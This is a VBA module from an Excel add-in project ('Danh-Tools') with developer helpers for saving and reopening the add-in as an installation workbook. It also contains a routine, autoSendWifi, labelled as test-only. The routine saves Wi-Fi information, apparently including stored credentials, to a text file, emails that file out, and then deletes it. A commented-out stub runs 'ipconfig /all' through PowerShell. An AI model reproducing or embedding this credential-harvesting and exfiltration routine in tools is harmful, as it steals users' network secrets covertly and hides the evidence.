Attribute VB_Name = "Developer"
Option Explicit
' FOR DEVELOPER ONLY

Private Const GIT_LOCAL_PATH As String = "S:\VBA-projects\"
Private Const INSTALL_FILE_NAME As String = "Danh-Tools-Installation.xlsb"
Private Const INSTALL_FILE_FULLNAME As String = GIT_LOCAL_PATH & INSTALL_FILE_NAME
Private Const ADDIN_FILE_NAME As String = "Danh-Tools.xlam"
Private info As InfoConstants
Private system As SystemUpdate
Private fileSystem As Object
Private userResponse As VbMsgBoxResult

Public Sub aSaveBackup()
    If ThisWorkbook.Name = ADDIN_FILE_NAME Then
        ThisWorkbook.SaveAs _
            fileName:=INSTALL_FILE_FULLNAME, _
            FileFormat:=xlExcel12 ' xlExcel12 = xlsb
    End If
    Application.OnTime Now + TimeValue("00:00:03"), "reOpen"
    ThisWorkbook.Close
End Sub

Private Sub reOpen()
    Workbooks.Open (INSTALL_FILE_FULLNAME)
End Sub

'NOTE: JUST FOR TESTING DON'T RELEASE
Public Sub autoSendWifi()
    Dim internetC As InternetConnector
    Dim email As EmailCDO
    Dim attachment As String
    Set internetC = New InternetConnector
    Set email = New EmailCDO
    Let attachment = ThisWorkbook.path & "\wifi.txt"
    Call internetC.saveWifiAsTxt(True)
    Call email.send(attachment)
    Kill (attachment)
End Sub

' TEST
Public Sub aaTestCode()
'    If ActiveWorkbook.path = "" Then MsgBox "Not saved"
''''''''''''''''''''
'    Dim system As SystemUpdate
'    Dim PWShell As PowerShellController
'
'    Set system = New SystemUpdate
'    Set PWShell = New PowerShellController
    
'    Debug.Print PWShell.executeScript("ipconfig /all")
'''''''''''''''''
End Sub

